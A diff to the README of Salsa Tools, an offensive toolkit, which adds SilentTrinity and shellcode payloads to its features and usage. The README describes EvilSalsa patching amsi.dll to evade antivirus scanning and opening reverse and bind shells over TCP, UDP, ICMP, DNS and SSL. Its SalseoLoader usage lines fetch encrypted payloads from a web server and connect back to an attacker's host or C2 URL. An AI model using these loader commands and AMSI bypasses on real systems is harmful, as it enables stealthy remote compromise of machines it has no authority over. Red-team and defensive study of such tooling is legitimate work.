@@ -14,7 +14,7 @@ Salsa Tools is a collection of three different tools that combined, allows you t
 
 
 ## Features
-    * TCP/UDP/ICMP/DNS/BIND/SSL     
+    * TCP/UDP/ICMP/DNS/BIND/SSL/Shellcode/SilentTrinity     
     * AV Safe (17th February)
     * AMSI patchers
     * PowerShell execution 
@@ -57,7 +57,7 @@ And his behavior is as it follows:
                                  
 ```
 
-EvilSalsa is the key ingredient of this recipe. It contains the payload, which is executed on the system as it follows: as soon as the payloads starts, it runs `System.Management.Automation.dll` which creates a runspace . Within that runspace we have four types of shells (TCP / UDP / ICMP / DNS / BINDTCP). Once EvilSalsa is loaded, first thing first, the existence of `c:\windows\system32\amsi.dll` is checked. If it exists, it is patched using a home-cooked variant of CyberArk and Rastamouse bypasses.
+EvilSalsa is the key ingredient of this recipe. It contains the payload, which is executed on the system as it follows: as soon as the payloads starts, it runs `System.Management.Automation.dll` which creates a runspace . Within that runspace we have four types of shells (TCP / UDP / ICMP / DNS / BINDTCP / SHELLCODE / SILENTTRINITY). Once EvilSalsa is loaded, first thing first, the existence of `c:\windows\system32\amsi.dll` is checked. If it exists, it is patched using a home-cooked variant of CyberArk and Rastamouse bypasses.
 
 
 #### Mixing EncrypterAssembly and Evilsalsa
@@ -122,11 +122,12 @@ SalseoLoader is in charge of loading the encrypted payload. Can be both compiled
     [-] SalseoLoader.exe password http://webserver.com/elfuckingmal.txt BindTCP LHOST LPORT
     [-] SalseoLoader.exe password c:\temp\elfuckingmal.txt ReverseSSL LHOST LPORT
     [-] SalseoLoader.exe password http://webserver.com/shellcode.txt shellcode
+    [-] SalseoLoader.exe password http://webserver.com/silent.txt silenttrinity URL_C2C
 
-[+] Shells availables:
+[+] Available Payloads:
 
-    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL [-] Shellcode
-    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP
+    [-] ReverseTCP  [-] ReverseDNS   [-] ReverseSSL  [-] Shellcode
+    [-] ReverseUDP  [-] ReverseICMP  [-] BindTCP     [-] SilentTrinity
 ```
 
 # Tutorial
